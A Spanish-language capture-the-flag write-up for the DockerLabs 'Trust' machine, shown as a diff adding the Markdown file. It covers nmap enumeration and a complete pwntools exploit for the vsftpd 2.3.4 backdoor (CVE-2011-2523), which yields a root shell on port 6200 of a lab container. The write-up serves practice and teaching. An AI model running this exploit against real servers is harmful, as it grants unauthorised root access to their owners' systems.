@@ -1,0 +1,102 @@
+---
+type: writeup
+title: Trust
+description: ""
+lang: es
+draft: false
+image: ../../../images/writeups/dockerlabs/dockerlabs.webp
+platform: dockerlabs
+url: https://dockerlabs.es/
+difficulty: muyfacil
+os: linux
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Escaneo de puertos con `nmap` para ver cuales están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/trust 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+21/tcp open  ftp     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 64
+```
+
+```bash
+nmap -p 21,80 -sCV -oA nmap/openports 172.17.0.2
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+|_ftp-anon: got code 500 "OOPS: cannot change directory:/var/ftp".
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+Service Info: OS: Unix
+```
+
+Buscamos con `searchsploit` si el servicio ftp en la versión vsftpd 2.3.4 es vulnerable
+
+```bash
+searchsploit vsftpd 2.3.4
+```
+
+```plaintext
+vsftpd 2.3.4 - Backdoor Command Execution                                                                                                 | unix/remote/49757.py
+```
+
+Encontramos que esa versión es vulnerable. Ahora miramos el contenido del script con el comando `searchsploit -x 49757` y encontramos el [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) que corresponde a la vulnerabilidad, el mismo contiene un backdoor que abre una shell en el puerto 6200/tcp. Ya que el script de searchsploit usa una librería de Python que está obsoleta creamos nuestro propio exploit.
+
+## Exploitation
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import argparse
+
+parser = argparse.ArgumentParser(description="vsFTPd 2.3.4 Backdoor Exploit")
+parser.add_argument("-t", "--target", required=True, help="Target IP address or hostname")
+
+args = parser.parse_args()
+host = args.target
+
+ftp = remote(host, 21)
+
+ftp.recvuntil(b"vsFTPd")
+ftp.sendline(b"USER nergal:)")
+ftp.recvuntil(b"password")
+ftp.sendline(b"PASS pass")
+
+shell = remote(host, 6200)
+shell.interactive()
+```
+
+Ejecutamos el `exploit.py` pasandole la ip del target y obtenemos la shell como el usuario `root`.
+
+```bash
+python3 exploit.py -t 172.17.0.2
+```
+
+```plaintext
+[+] Opening connection to 172.17.0.2 on port 21: Done
+[+] Opening connection to 172.17.0.2 on port 6200: Done
+[*] Switching to interactive mode
+$
+```
+
+Una vez obtenida la shell ejecutamos el comando `id` para saber qué usuario está ejecutando el proceso actual y verificamos que estamos conectados como el usuario `root`.
+
+```bash
+id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
